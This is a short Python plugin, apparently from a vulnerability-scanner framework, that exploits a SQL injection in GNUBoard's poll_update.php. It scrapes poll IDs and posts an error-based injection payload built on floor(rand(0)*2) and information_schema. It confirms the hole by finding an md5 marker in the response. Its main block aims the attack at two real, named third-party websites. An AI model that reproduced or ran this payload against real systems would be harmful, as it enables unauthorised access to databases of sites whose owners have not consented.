#!/usr/bin/env python
# -*- coding: utf-8 -*-
import re



def assign(service, arg):
    if service == "gnuboard":
        return True, arg

def audit(arg):
    code, head, res, errcode, _ = curl.curl(arg)
    if code == 200:
        po_ids = re.findall(r'name="po_id" value="(\d+)"',res)
        for po_id in po_ids:
            url = arg+'bbs/poll_update.php'
            post = "_SERVER[REMOTE_ADDR]=86117&po_id=%s&gb_poll=1=1 and(select 1 from(select count(*),concat((select md5(123)),floor(rand(0)*2))x from information_schema.tables group by x)a)" % po_id
            code, head, res, errcode, _ = curl.curl("-d \"%s\" %s" %(post,url))
            if code == 200 and '202cb962ac59075b964b07152d234b701' in res:
                security_info(url)
                break

if __name__ == '__main__':
    from dummy import *
    audit(assign('gnuboard', 'http://gulfkoreantimes.com/gkt/')[1])
    audit(assign('gnuboard', 'http://ksenet.org/')[1])
